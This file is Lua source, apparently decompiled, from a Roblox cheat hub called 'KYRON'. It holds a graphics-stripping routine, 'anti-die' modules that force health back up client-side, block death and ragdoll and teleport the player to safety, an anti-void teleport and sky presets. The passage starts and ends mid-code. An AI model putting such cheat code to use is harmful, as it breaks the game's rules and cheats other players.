            _G._KYRONVisualStripOn = true
            _G._KYRONVisualStripConnections = _G._KYRONVisualStripConnections or {}

            for _, KYRONVisualStripConnection in ipairs(_G._KYRONVisualStripConnections) do
              pcall(function()
                KYRONVisualStripConnection:Disconnect()
              end)
            end

            _G._KYRONVisualStripConnections = {}

            local function fn48(arg)
              local character = arg:FindFirstAncestorOfClass("Tool") and localPlayer.Character and arg:IsDescendantOf(localPlayer.Character)
              local flag28

              if character then
                local v78 = true
                flag28 = localPlayer:GetAttribute("Stealing") == v78
              else
                flag28 = character
              end

              if flag28 then
                return true
              end

              for _, player in ipairs(Players:GetPlayers()) do
                if player.Character and arg:IsDescendantOf(player.Character) then
                  return false
                end
              end

              local flag29 = false
              local flag30 = false

              for i = 1, 10 do
                if not arg then
                  break
                end
                local v78 = string.lower(arg.Name or "")
                if string.find(v78, "brainrot", 1, true) then
                  return true
                end

                if v78 == "animals" then
                  flag29 = true
                end

                if arg:IsA("Model") and (arg:FindFirstChildOfClass("AnimationController") or arg:FindFirstChildOfClass("Animator")) then
                  flag30 = true
                end

                arg = arg.Parent
              end

              return flag29 and flag30
            end

            local function fn49(arg)
              if not _G._KYRONVisualStripOn then
                return
              end

              pcall(function()
                local v78 = fn48(arg)

                if arg:IsA("BasePart") then
                  if not v78 then
                    arg.Material = Enum.Material.SmoothPlastic
                    arg.MaterialVariant = ""
                  end

                  arg.Reflectance = 0
                  arg.CastShadow = false
                  local v79 = string.lower(arg.Name or "")

                  if arg:FindFirstChildWhichIsA("Light", true) or string.find(v79, "light", 1, true) or string.find(v79, "lamp", 1, true) then
                    arg.LocalTransparencyModifier = 1
                  end

                  if arg:FindFirstAncestorOfClass("Accessory") then
                    arg.LocalTransparencyModifier = 1
                  end
                elseif arg:IsA("Shirt") or arg:IsA("Pants") or arg:IsA("ShirtGraphic") or arg:IsA("BodyColors") then
                  arg:Destroy()
                elseif arg:IsA("FaceControls") then
                  arg:Destroy()
                elseif arg:IsA("Decal") or arg:IsA("Texture") or arg:IsA("SurfaceAppearance") then
                  if not v78 then
                    arg:Destroy()
                  end
                elseif arg:IsA("SpecialMesh") then
                  if not v78 then
                    arg.TextureId = ""
                  end
                elseif arg:IsA("Animator") then
                  local model = arg:FindFirstAncestorOfClass("Model")

                  if not (model and Players:GetPlayerFromCharacter(model)) then
                    for _, v79 in ipairs(arg:GetPlayingAnimationTracks()) do
                      pcall(function()
                        v79:Stop(0)
                        v79:AdjustSpeed(0)
                      end)
                    end

                    table.insert(
                      _G._KYRONVisualStripConnections,
                      arg.AnimationPlayed:Connect(function(arg2)
                        if _G._KYRONVisualStripOn then
                          pcall(function()
                            arg2:Stop(0)
                            arg2:AdjustSpeed(0)
                          end)
                        end
                      end)
                    )
                  end
                elseif arg:IsA("ParticleEmitter") or arg:IsA("Trail") or arg:IsA("Beam") or arg:IsA("Smoke") or arg:IsA("Fire") or arg:IsA("Sparkles") or arg:IsA("Highlight") then
                  arg:Destroy()
                elseif arg:IsA("Light") then
                  local basePart = arg:FindFirstAncestorWhichIsA("BasePart")

                  if basePart then
                    basePart.LocalTransparencyModifier = 1
                  end

                  arg:Destroy()
                elseif arg:IsA("ImageLabel") or arg:IsA("ImageButton") then
                  arg.Image = ""
                elseif arg:IsA("Sky") or arg:IsA("Atmosphere") or arg:IsA("Clouds") or arg:IsA("PostEffect") then
                  arg:Destroy()
                end
              end)
            end

            pcall(function()
              Lighting.GlobalShadows = false
              Lighting.EnvironmentDiffuseScale = 0
              Lighting.EnvironmentSpecularScale = 0
              Lighting.FogStart = 1e9
              Lighting.FogEnd = 1e9
              local v78 = workspace:FindFirstChildOfClass("Terrain")

              if v78 then
                v78.Decoration = false
                v78.WaterWaveSize = 0
                v78.WaterWaveSpeed = 0
                v78.WaterReflectance = 0
                v78.WaterTransparency = 1
              end

              for _, descendant in ipairs(Lighting:GetDescendants()) do
                fn49(descendant)
              end
            end)

            task.spawn(function()
              for i, descendant in ipairs(workspace:GetDescendants()) do
                if not _G._KYRONVisualStripOn then
                  return
                end
                fn49(descendant)

                if i % 100 == 0 then
                  task.wait()
                end
              end
            end)

            table.insert(
              _G._KYRONVisualStripConnections,
              workspace.DescendantAdded:Connect(function(descendant)
                task.defer(fn49, descendant)
              end)
            )

            table.insert(
              _G._KYRONVisualStripConnections,
              Lighting.DescendantAdded:Connect(function(descendant)
                task.defer(fn49, descendant)
              end)
            )
          end

          do
            if type(_G._KYRONDestroyAntiDie) == "function" then
              pcall(_G._KYRONDestroyAntiDie)
            elseif type(_G._KYRONStopAntiDie) == "function" then
              pcall(_G._KYRONStopAntiDie)
            end
          end
        end

        _G._KYRONTpBatActive = false
        _G._KYRONAntiDie = nil
        _G._KYRONStartAntiDie = nil
        _G._KYRONStopAntiDie = nil
        _G._KYRONDestroyAntiDie = nil

        do
          local function fn48()
            local tbl37 = {
              healthThreshold = 25,
              fallDamageProtection = true,
              ragdollProtection = true,
              invincibilityFrames = 0.5,
              autoRevive = true,
            }

            local tbl38 = {
              userEnabled = false,
              tpBatActive = false,
              active = false,
              dropActive = false,
              invincibleUntil = 0,
              lastSafeCFrame = nil,
              lastSafePosition = nil,
              humanoid = nil,
              root = nil,
              conns = {},
            }

            local function fn49(arg)
              local v78 = tbl38.conns[arg]

              if v78 then
                pcall(function()
                  v78:Disconnect()
                end)

                tbl38.conns[arg] = nil
              end
            end

            local function fn50()
              return tbl38.tpBatActive and _G._KYRONTpBatActive == true and combatSettings.desync == true
            end

            local function fn51(arg, arg2)
              if not arg or not arg.Parent then
                return
              end
              local lastSafeCFrame = tbl38.lastSafeCFrame

              if lastSafeCFrame then
                arg.CFrame = lastSafeCFrame + Vector3.new(0, arg2 or 3, 0)
              else
                arg.CFrame = CFrame.new(arg.Position.X, 8, arg.Position.Z)
              end

              arg.AssemblyLinearVelocity = Vector3.zero
              arg.AssemblyAngularVelocity = Vector3.zero

              pcall(function()
                arg.Velocity = Vector3.zero
                arg.RotVelocity = Vector3.zero
              end)
            end

            local function fn52(arg)
              if not tbl38.active or not arg or not arg.Parent then
                return
              end
              local maxHealth = arg.MaxHealth > 0 and arg.MaxHealth or 100
              if arg.Health >= maxHealth and arg.Health > 0 then
                return
              end

              pcall(function()
                arg.Health = maxHealth
              end)

              local invincibilityFrames = tbl37.invincibilityFrames
              tbl38.invincibleUntil = tick() + invincibilityFrames

              pcall(function()
                for _, child in ipairs(arg.Parent:GetChildren()) do
                  local str10 = child.Name:lower()
                  local isNumberValue = child:IsA("NumberValue")

                  if isNumberValue then
                    isNumberValue = str10:find("health") or str10:find("hp") or str10:find("life")
                  end

                  if isNumberValue then
                    child.Value = 100
                  elseif child:IsA("BoolValue") and str10:find("dead") then
                    child.Value = false
                  end
                end

                if arg.Health < maxHealth then
                  arg.Health = maxHealth
                end
              end)
            end

            local function fn53(arg, cameraSubject, arg2)
              if not tbl37.ragdollProtection or not cameraSubject then
                return
              end
              local state = cameraSubject:GetState()
              if state ~= Enum.HumanoidStateType.Physics and state ~= Enum.HumanoidStateType.Ragdoll and state ~= Enum.HumanoidStateType.FallingDown then
                return
              end

              pcall(function()
                for _, descendant in ipairs(arg:GetDescendants()) do
                  if descendant:IsA("Motor6D") then
                    descendant.Enabled = true
                  end

                  if descendant:IsA("Constraint") then
                    descendant.Enabled = true
                  end
                end

                cameraSubject.PlatformStand = false
                cameraSubject.Sit = false
                cameraSubject.AutoRotate = true
                cameraSubject:ChangeState(Enum.HumanoidStateType.GettingUp)

                if arg2 then
                  arg2.AssemblyLinearVelocity = Vector3.zero
                  arg2.AssemblyAngularVelocity = Vector3.zero
                end

                local currentCamera = workspace.CurrentCamera

                if currentCamera then
                  currentCamera.CameraSubject = cameraSubject
                end

                local playerScripts = localPlayer:FindFirstChild("PlayerScripts")
                playerScripts = playerScripts and playerScripts:FindFirstChild("PlayerModule")
                playerScripts = playerScripts and playerScripts:FindFirstChild("ControlModule")

                if playerScripts then
                  local module = require(playerScripts)

                  if module and module.Enable then
                    module:Enable()
                  end
                end
              end)
            end

            local function fn54(arg, arg2)
              if not arg2 or not arg2.Parent or not arg or arg.Health <= 0 then
                return
              end
              local position = arg2.Position

              if position.Y > -30 and position.Y < 400 and arg2.AssemblyLinearVelocity.Magnitude < 50 then
                tbl38.lastSafeCFrame = arg2.CFrame
                tbl38.lastSafePosition = position
              end
            end

            local function fn55(arg, arg2, arg3)
              if not tbl37.fallDamageProtection or tbl38.dropActive or dropControllerState and dropControllerState.active then
                return
              end
              local assemblyLinearVelocity = arg3.AssemblyLinearVelocity
              local assemblyAngularVelocity = arg3.AssemblyAngularVelocity
              local position = arg3.Position
              local magnitude = assemblyLinearVelocity.Magnitude
              fn54(arg2, arg3)

              if magnitude >= 90 or math.abs(assemblyLinearVelocity.Y) >= 80 or assemblyAngularVelocity.Magnitude >= 35 then
                arg3.AssemblyLinearVelocity = Vector3.zero
                arg3.AssemblyAngularVelocity = Vector3.zero

                pcall(function()
                  arg3.Velocity = Vector3.zero
                  arg3.RotVelocity = Vector3.zero
                end)

                if tbl38.lastSafePosition and (position - tbl38.lastSafePosition).Magnitude > 25 then
                  arg3.CFrame = tbl38.lastSafeCFrame + Vector3.new(0, 2, 0)
                end
              end

              if position.Y < -100 or position.Y > 900 then
                fn51(arg3, 4)
                fn52(arg2)
              end

              if magnitude > 5000 then
                arg3.AssemblyLinearVelocity = Vector3.new(0, 0.1, 0)
                arg3.AssemblyAngularVelocity = Vector3.zero
                fn52(arg2)
              end
            end

            local function fn56(arg)
              if not tbl38.active or not arg then
                return
              end
              fn49("health")
              local humanoid = arg:FindFirstChildOfClass("Humanoid") or arg:WaitForChild("Humanoid", 2)
              local humanoidRootPart = arg:FindFirstChild("HumanoidRootPart") or arg:WaitForChild("HumanoidRootPart", 2)
              if not tbl38.active or not humanoid or not humanoidRootPart then
                return
              end
              local v78 = tbl38
              tbl38.humanoid = humanoid
              v78.root = humanoidRootPart

              pcall(function()
                humanoid.BreakJointsOnDeath = false
                humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
              end)

              local v79 = tbl38
              local position = humanoidRootPart.Position
              tbl38.lastSafeCFrame = humanoidRootPart.CFrame
              v79.lastSafePosition = position

              tbl38.conns.health = humanoid:GetPropertyChangedSignal("Health"):Connect(function()
                if not tbl38.active then
                  return
                end

                if humanoid.Health <= 0 and tbl37.autoRevive then
                  fn52(humanoid)
                  fn51(humanoidRootPart, 10)

                  pcall(function()
                    do
                      humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                      return
                    end
                  end)
                elseif humanoid.Health <= tbl37.healthThreshold then
                  fn52(humanoid)
                end
              end)

              fn52(humanoid)
            end

            local function fn57()
              tbl38.active = false
              fn49("heartbeat")
              fn49("character")
              fn49("health")
              local v78 = tbl38
              tbl38.humanoid = nil
              v78.root = nil
              local v79 = tbl38
              tbl38.lastSafeCFrame = nil
              v79.lastSafePosition = nil
              tbl38.invincibleUntil = 0
            end

            local function fn58()
              if tbl38.active or not fn50() then
                return
              end
              tbl38.active = true
              fn56(localPlayer.Character)

              tbl38.conns.character = localPlayer.CharacterAdded:Connect(function(character)
                task.delay(0.1, function()
                  if tbl38.active then
                    fn56(character)
                  end
                end)
              end)

              tbl38.conns.heartbeat = RunService.Heartbeat:Connect(function()
                if not tbl38.active or not fn50() then
                  fn57()
                  return
                end
                local character = localPlayer.Character
                local humanoid = tbl38.humanoid
                local root = tbl38.root
                if not character or not humanoid or not root or not humanoid.Parent or not root.Parent then
                  return
                end
                tbl38.dropActive = dropControllerState and dropControllerState.active == true

                pcall(function()
                  humanoid.BreakJointsOnDeath = false
                  humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
                end)

                if humanoid.Health <= 0 and tbl37.autoRevive then
                  fn52(humanoid)
                  fn51(root, 3)

                  pcall(function()
                    humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                  end)
                elseif humanoid.Health <= tbl37.healthThreshold then
                  fn52(humanoid)
                end

                local invincibleUntil = tbl38.invincibleUntil

                if tick() < invincibleUntil and humanoid.Health < humanoid.MaxHealth then
                  pcall(function()
                    humanoid.Health = humanoid.MaxHealth
                  end)
                end

                fn53(character, humanoid, root)
                fn55(character, humanoid, root)
              end)
            end

            local KYRONAntiDie = {
              Config = tbl37,
              toggle = function(arg)
                tbl38.userEnabled = arg == true

                if fn50() then
                  fn58()
                else
                  fn57()
                end
              end,
              start = function()
                tbl38.tpBatActive = true
                fn58()
              end,
              stop = function()
                tbl38.tpBatActive = false
                fn57()
              end,
              setDropActive = function(arg)
                tbl38.dropActive = arg == true
              end,
              destroy = function()
                local v78 = tbl38
                tbl38.userEnabled = false
                v78.tpBatActive = false
                fn57()
              end,
            }

            _G._KYRONAntiDie = KYRONAntiDie
            _G._KYRONTpBatAntiDie = KYRONAntiDie
            _G._KYRONStartAntiDie = KYRONAntiDie.start
            _G._KYRONStopAntiDie = KYRONAntiDie.stop
            _G._KYRONDestroyAntiDie = KYRONAntiDie.destroy
          end

          fn48()
        end
      end

      do
        do
          local function fn48()
            if _G._KYRONTpBatAntiDie then
              pcall(function()
                local KYRONTpBatAntiDie = _G._KYRONTpBatAntiDie

                if KYRONTpBatAntiDie.destroy then
                  KYRONTpBatAntiDie.destroy()
                elseif KYRONTpBatAntiDie.stop then
                  KYRONTpBatAntiDie.stop()
                end
              end)
            end

            if _G._KYRONGlobalAntiVoid and _G._KYRONGlobalAntiVoid.Destroy then
              pcall(_G._KYRONGlobalAntiVoid.Destroy)
            end

            local KYRONGlobalAntiVoid = {
              enabled = false,
              loop = nil,
              charConn = nil,
              suspendedUntil = 0,
              lastGroundCF = nil,
              lastGroundAt = 0,
              savedAt = 0,
              config = {
                voidY = -60,
                ceilingY = 900,
                fallSpeed = 180,
                lift = 3,
                saveInterval = 0.15,
                regrab = 0.28,
              },
            }

            local function fn49()
              local suspendedUntil = KYRONGlobalAntiVoid.suspendedUntil
              return os.clock() < suspendedUntil
            end

            local function fn50(arg, arg2)
              local flag28 = not KYRONGlobalAntiVoid.lastGroundCF
              local flag29

              if flag28 then
                flag29 = flag28
              else
                local lastGroundAt = KYRONGlobalAntiVoid.lastGroundAt
                flag29 = os.clock() - lastGroundAt < KYRONGlobalAntiVoid.config.regrab
              end

              if flag29 then
                return
              end
              KYRONGlobalAntiVoid.lastGroundAt = os.clock()
              local cFrame = KYRONGlobalAntiVoid.lastGroundCF + Vector3.new(0, KYRONGlobalAntiVoid.config.lift, 0)

              pcall(function()
                arg.AssemblyLinearVelocity = Vector3.zero
                arg.AssemblyAngularVelocity = Vector3.zero
                arg.CFrame = cFrame
                arg.AssemblyLinearVelocity = Vector3.zero
                arg.AssemblyAngularVelocity = Vector3.zero
              end)

              if arg2 then
                pcall(function()
                  arg2.PlatformStand = false
                  arg2:ChangeState(Enum.HumanoidStateType.GettingUp)
                end)
              end
            end

            local function fn51()
              if not KYRONGlobalAntiVoid.enabled or fn49() then
                return
              end
              local character = localPlayer.Character
              if not character then
                return
              end
              local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
              if not humanoidRootPart then
                return
              end
              local humanoid = character:FindFirstChildOfClass("Humanoid")
              if humanoid and humanoid.Health <= 0 then
                return
              end
              local position = humanoidRootPart.Position
              local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
              local now2 = os.clock()

              if
                humanoid
                and humanoid.FloorMaterial ~= Enum.Material.Air
                and assemblyLinearVelocity.Magnitude < 60
                and position.Y > KYRONGlobalAntiVoid.config.voidY
                and position.Y < KYRONGlobalAntiVoid.config.ceilingY
                and now2 - KYRONGlobalAntiVoid.savedAt >= KYRONGlobalAntiVoid.config.saveInterval
              then
                KYRONGlobalAntiVoid.savedAt = now2
                KYRONGlobalAntiVoid.lastGroundCF = CFrame.new(position, position + humanoidRootPart.CFrame.LookVector)
              end

              if position.Y < KYRONGlobalAntiVoid.config.voidY or position.Y > KYRONGlobalAntiVoid.config.ceilingY or assemblyLinearVelocity.Y < -KYRONGlobalAntiVoid.config.fallSpeed and position.Y < 0 then
                fn50(humanoidRootPart, humanoid)
              end
            end

            local function fn52()
              KYRONGlobalAntiVoid.enabled = false

              if KYRONGlobalAntiVoid.loop then
                KYRONGlobalAntiVoid.loop:Disconnect()
                KYRONGlobalAntiVoid.loop = nil
              end

              if KYRONGlobalAntiVoid.charConn then
                KYRONGlobalAntiVoid.charConn:Disconnect()
                KYRONGlobalAntiVoid.charConn = nil
              end

              KYRONGlobalAntiVoid.lastGroundCF = nil
            end

            local function fn53()
              if KYRONGlobalAntiVoid.enabled and KYRONGlobalAntiVoid.loop then
                return
              end
              KYRONGlobalAntiVoid.enabled = true
              local character = localPlayer.Character
              character = character and character:FindFirstChild("HumanoidRootPart")

              if character and character.Position.Y > KYRONGlobalAntiVoid.config.voidY then
                KYRONGlobalAntiVoid.lastGroundCF = CFrame.new(character.Position, character.Position + character.CFrame.LookVector)
              end

              KYRONGlobalAntiVoid.loop = RunService.Heartbeat:Connect(fn51)

              KYRONGlobalAntiVoid.charConn = localPlayer.CharacterAdded:Connect(function()
                local v78 = KYRONGlobalAntiVoid
                local v79 = KYRONGlobalAntiVoid
                KYRONGlobalAntiVoid.lastGroundCF = nil
                v78.lastGroundAt = 0
                v79.savedAt = 0
              end)
            end

            KYRONGlobalAntiVoid.SetEnabled = function(arg)
              if arg then
                fn53()
              else
                fn52()
              end
            end

            KYRONGlobalAntiVoid.IsEnabled = function()
              return KYRONGlobalAntiVoid.enabled
            end

            KYRONGlobalAntiVoid.Suspend = function(arg)
              KYRONGlobalAntiVoid.suspendedUntil = os.clock() + (tonumber(arg) or 6)
            end

            KYRONGlobalAntiVoid.Resume = function()
              KYRONGlobalAntiVoid.suspendedUntil = 0
            end

            KYRONGlobalAntiVoid.Destroy = function()
              fn52()
              _G._KYRONGlobalAntiVoid = nil
            end

            _G._KYRONGlobalAntiVoid = KYRONGlobalAntiVoid
            _G._KYRONGlobalAntiVoidEnabled = true
            fn53()

            local tbl37 = {
              active = false,
              tpBatActive = false,
              conns = {},
              lastSafeCFrame = nil,
              lastSafePosition = nil,
              invincibleUntil = 0,
              humanoid = nil,
              originalBreakJoints = nil,
              originalDeadEnabled = nil,
            }

            local function fn54(arg)
              local v78 = tbl37.conns[arg]

              if v78 then
                pcall(function()
                  v78:Disconnect()
                end)

                tbl37.conns[arg] = nil
              end
            end

            local function fn55(arg)
              if not tbl37.active or not arg or not arg.Parent then
                return
              end
              local maxHealth = arg.MaxHealth > 0 and arg.MaxHealth or 100

              pcall(function()
                arg.Health = maxHealth
              end)

              tbl37.invincibleUntil = os.clock() + 0.5

              pcall(function()
                for _, child in ipairs(arg.Parent:GetChildren()) do
                  if child:IsA("NumberValue") then
                    local str10 = child.Name:lower()

                    if str10:find("health") or str10:find("life") or str10:find("hp") then
                      child.Value = maxHealth
                    end
                  elseif child:IsA("BoolValue") and child.Name:lower():find("ragdoll") then
                    child.Value = false
                  end
                end
              end)
            end

            local function fn56()
              local humanoid = tbl37.humanoid

              if humanoid and humanoid.Parent then
                pcall(function()
                  if tbl37.originalBreakJoints ~= nil then
                    humanoid.BreakJointsOnDeath = tbl37.originalBreakJoints
                  end

                  if tbl37.originalDeadEnabled ~= nil then
                    humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, tbl37.originalDeadEnabled)
                  end

                  humanoid.PlatformStand = false
                end)
              end

              local v78 = tbl37
              local v79 = tbl37
              tbl37.humanoid = nil
              v78.originalBreakJoints = nil
              v79.originalDeadEnabled = nil
            end

            local function fn57(arg)
              if not tbl37.active or not arg then
                return
              end
              fn54("health")
              fn56()
              local v78 = arg:FindFirstChildOfClass("Humanoid") or arg:WaitForChild("Humanoid", 2)
              if not tbl37.active or not v78 then
                return
              end
              local humanoidRootPart = arg:FindFirstChild("HumanoidRootPart")
              tbl37.humanoid = v78
              tbl37.originalBreakJoints = v78.BreakJointsOnDeath

              pcall(function()
                tbl37.originalDeadEnabled = v78:GetStateEnabled(Enum.HumanoidStateType.Dead)
              end)

              pcall(function()
                v78.BreakJointsOnDeath = false
                v78:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
              end)

              if humanoidRootPart then
                local v79 = tbl37
                local cFrame = humanoidRootPart.CFrame
                local position = humanoidRootPart.Position
                tbl37.lastSafeCFrame = cFrame
                v79.lastSafePosition = position
              end

              tbl37.conns.health = v78:GetPropertyChangedSignal("Health"):Connect(function()
                if tbl37.active and v78.Health <= 25 then
                  fn55(v78)

                  pcall(function()
                    v78:ChangeState(Enum.HumanoidStateType.GettingUp)
                  end)
                end
              end)
            end

            local function fn58()
              tbl37.active = false
              fn54("heartbeat")
              fn54("character")
              fn54("health")
              fn56()
              local v78 = tbl37
              local v79 = tbl37
              local v80 = 0
              tbl37.lastSafeCFrame = nil
              v78.lastSafePosition = nil
              v79.invincibleUntil = v80
            end

            local function fn59()
              if tbl37.active then
                return
              end
              tbl37.active = true
              fn57(localPlayer.Character)

              tbl37.conns.character = localPlayer.CharacterAdded:Connect(function(character)
                task.wait(0.1)

                if tbl37.active then
                  fn57(character)
                end
              end)

              tbl37.conns.heartbeat = RunService.Heartbeat:Connect(function()
                if not tbl37.active then
                  return
                end

                if not tbl37.tpBatActive then
                  fn58()
                  return
                end
                local character = localPlayer.Character
                local v78 = character and character:FindFirstChildOfClass("Humanoid")
                local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
                if not v78 or not humanoidRootPart then
                  return
                end

                pcall(function()
                  v78.BreakJointsOnDeath = false
                  v78:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
                end)

                local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
                local assemblyAngularVelocity = humanoidRootPart.AssemblyAngularVelocity
                local magnitude = assemblyLinearVelocity.Magnitude
                local position = humanoidRootPart.Position

                if magnitude < 50 and position.Y > -30 and position.Y < 400 then
                  local v79 = tbl37
                  tbl37.lastSafeCFrame = humanoidRootPart.CFrame
                  v79.lastSafePosition = position
                end

                local flag28 = not dropControllerState.active

                if flag28 then
                  flag28 = magnitude >= 90 or math.abs(assemblyLinearVelocity.Y) >= 80 or assemblyAngularVelocity.Magnitude >= 40
                end

                if flag28 then
                  pcall(function()
                    humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
                    humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
                  end)

                  if tbl37.lastSafePosition and (position - tbl37.lastSafePosition).Magnitude > 35 then
                    local lookVector = humanoidRootPart.CFrame.LookVector

                    pcall(function()
                      humanoidRootPart.CFrame = CFrame.new(tbl37.lastSafePosition, tbl37.lastSafePosition + lookVector)
                    end)
                  end
                end

                if tbl37.lastSafeCFrame and (position.Y < -100 or position.Y > 900) then
                  pcall(function()
                    humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
                    humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
                    humanoidRootPart.CFrame = tbl37.lastSafeCFrame
                  end)
                end

                local state = v78:GetState()

                if v78.PlatformStand or state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown then
                  pcall(function()
                    v78.PlatformStand = false
                    v78:ChangeState(Enum.HumanoidStateType.GettingUp)
                  end)
                end

                local flag29 = v78.Health <= 30

                if not flag29 then
                  local invincibleUntil = tbl37.invincibleUntil
                  flag29 = os.clock() < invincibleUntil and v78.Health < v78.MaxHealth
                end

                if flag29 then
                  fn55(v78)
                end
              end)
            end

            local KYRONAntiDie = {
              start = function()
                tbl37.tpBatActive = true
                fn59()
              end,
              stop = function()
                tbl37.tpBatActive = false
                fn58()
              end,
              destroy = fn58,
            }

            _G._KYRONAntiDie = KYRONAntiDie
            _G._KYRONTpBatAntiDie = KYRONAntiDie
            _G._KYRONStartAntiDie = KYRONAntiDie.start
            _G._KYRONStopAntiDie = KYRONAntiDie.stop
            _G._KYRONDestroyAntiDie = KYRONAntiDie.destroy
          end

          fn48()
        end

        _G._KYRONStopVisualStrip = function()
          _G._KYRONVisualStripOn = false
          local v78 = ipairs
          local KYRONVisualStripConnections = _G._KYRONVisualStripConnections or {}

          for _, KYRONVisualStripConnection in v78(KYRONVisualStripConnections) do
            pcall(function()
              KYRONVisualStripConnection:Disconnect()
            end)
          end

          _G._KYRONVisualStripConnections = {}
        end

        do
          local tbl37 = {}

          _G._KYRONLegacyClearSky = function()
            for _, v78 in ipairs(tbl37) do
              pcall(function()
                v78:Destroy()
              end)
            end

            tbl37 = {}

            for _, child in ipairs(Lighting:GetChildren()) do
              if child:GetAttribute("_KYRONSky") then
                pcall(function()
                  child:Destroy()
                end)
              end
            end

            local terrain = workspace:FindFirstChildOfClass("Terrain")

            if terrain then
              for _, child in ipairs(terrain:GetChildren()) do
                if child:GetAttribute("_KYRONSky") then
                  pcall(function()
                    child:Destroy()
                  end)
                end
              end
            end
          end
        end
      end

      do
        _G._KYRONSkyOrder = {
          "Off",
          "Night",
          "Aurora",
          "Sunset",
          "Dusk",
          "Cyber",
          "Sakura",
          "Pink Night",
          "Blood Moon",
          "Emerald Dawn",
          "Volcanic",
          "Arctic",
          "Ocean",
          "Vaporwave",
          "Toxic",
          "Solar Eclipse",
          "Hellscape",
          "Heaven",
          "Storm",
          "Sunrise",
          "Deep Space",
          "Lavender Dream",
          "Inferno",
          "Galaxy",
        }

        do
          local v78 = _G
          local KYRONSkyPresets = _G._KYRONSkyPresets

          if not KYRONSkyPresets then
            local function fn48()
              return {
                ["Off"] = { kind = "off" },
                Night = {
                  clock = 22,
                  brightness = 2,
                  ambient = { 110, 100, 130 },
                  outAmb = { 120, 110, 140 },
                  sky = { stars = 4000, moon = 18, sun = 0, moonTex = true },
                  atm = {
                    dens = 0.5,
                    color = { 120, 60, 160 },
                    decay = { 60, 24, 100 },
                    glare = 0.5,
                    haze = 1.2,
                  },
                },
                Aurora = {
                  clock = 14,
                  brightness = 3,
                  ambient = { 150, 120, 140 },
                  outAmb = { 160, 130, 160 },
                  atm = {
                    dens = 0.55,
                    color = { 255, 80, 200 },
                    decay = { 255, 24, 150 },
                    glare = 2.5,
                    haze = 3,
                  },
                  clouds = { cover = 0.7, dens = 0.7, color = { 240, 240, 250 } },
                },
                Sunset = {
                  clock = 17.2,
                  brightness = 2.5,
                  ambient = { 170, 40, 100 },
                  outAmb = { 160, 130, 110 },
                  sky = { stars = 0, sun = 25, moon = 0 },
                  atm = {
                    dens = 0.5,
                    color = { 255, 130, 60 },
                    decay = { 255, 80, 30 },
                    glare = 2,
                    haze = 1.6,
                  },
                  clouds = { cover = 0.55, dens = 0.55, color = { 255, 200, 140 } },
                },
                ["Dusk"] = {
                  clock = 0,
                  brightness = 1.5,
                  ambient = { 70, 60, 100 },
                  outAmb = { 80, 70, 110 },
                  sky = { stars = 10000, moon = 30, sun = 0 },
                  atm = {
                    dens = 0.15,
                    color = { 40, 20, 100 },
                    decay = { 20, 10, 50 },
                    glare = 0.3,
                    haze = 0.5,
                  },
                },
                Cyber = {
                  clock = 6,
                  brightness = 2.2,
                  ambient = { 90, 120, 170 },
                  outAmb = { 100, 140, 180 },
                  sky = { stars = 5000, moon = 16 },
                  atm = {
                    dens = 0.4,
                    color = { 0, 210, 255 },
                    decay = { 150, 0, 240 },
                    glare = 2,
                    haze = 2,
                  },
                  clouds = { cover = 0.4, dens = 0.22, color = { 100, 210, 255 } },
                },
                Sakura = {
                  clock = 18,
                  brightness = 1.1,
                  ambient = { 170, 150, 160 },
                  outAmb = { 180, 160, 170 },
                  sky = { sun = 8 },
                  atm = {
                    dens = 0.3,
                    color = { 255, 200, 220 },
                    decay = { 255, 170, 200 },
                    glare = 1,
                    haze = 3,
                  },
                  clouds = { cover = 0.6, dens = 0.4, color = { 255, 250, 252 } },
                },
                ["Pink Night"] = {
                  clock = 23,
                  brightness = 2.2,
                  ambient = { 40, 65, 110 },
                  outAmb = { 140, 60, 120 },
                  sky = { stars = 5000, moon = 22, sun = 0, moonTex = true },
                  atm = {
                    dens = 0.5,
                    color = { 240, 80, 160 },
                    decay = { 90, 30, 100 },
                    glare = 0.7,
                    haze = 1.4,
                  },
                  clouds = { cover = 0.3, dens = 0.5, color = { 180, 90, 150 } },
                },
                ["Blood Moon"] = {
                  clock = 22.5,
                  brightness = 1.6,
                  ambient = { 130, 35, 35 },
                  outAmb = { 150, 60, 50 },
                  sky = { stars = 1500, moon = 28, sun = 0, moonTex = true },
                  atm = {
                    dens = 0.22,
                    color = { 175, 30, 30 },
                    decay = { 40, 12, 10 },
                    glare = 1.4,
                    haze = 2,
                  },
                  clouds = { cover = 0.5, dens = 0.65, color = { 120, 30, 30 } },
                },
                ["Emerald Dawn"] = {
                  clock = 6.5,
                  brightness = 2.8,
                  ambient = { 120, 170, 140 },
                  outAmb = { 90, 160, 150 },
                  sky = { sun = 14, moon = 0, stars = 0 },
                  atm = {
                    dens = 0.4,
                    color = { 100, 200, 90 },
                    decay = { 40, 140, 90 },
                    glare = 1.8,
                    haze = 2.2,
                  },
                  clouds = { cover = 0.5, dens = 0.5, color = { 200, 255, 175 } },
                },
                ["Volcanic"] = {
                  clock = 7,
                  brightness = 2,
                  ambient = { 160, 100, 40 },
                  outAmb = { 200, 90, 50 },
                  sky = { stars = 210, sun = 12, moon = 0 },
                  atm = {
                    dens = 0.62,
                    color = { 255, 60, 0 },
                    decay = { 180, 20, 0 },
                    glare = 3,
                    haze = 1.1,
                  },
                  clouds = {
                    cover = 0.75,
                    dens = 0.9,
                    color = { 40, 35, 20 },
                  },
                },
                Arctic = {
                  clock = 9,
                  brightness = 3.2,
                  ambient = { 200, 175, 235 },
                  outAmb = { 210, 190, 245 },
                  sky = { sun = 10, stars = 0, moon = 0 },
                  atm = {
                    dens = 0.25,
                    color = { 160, 175, 240 },
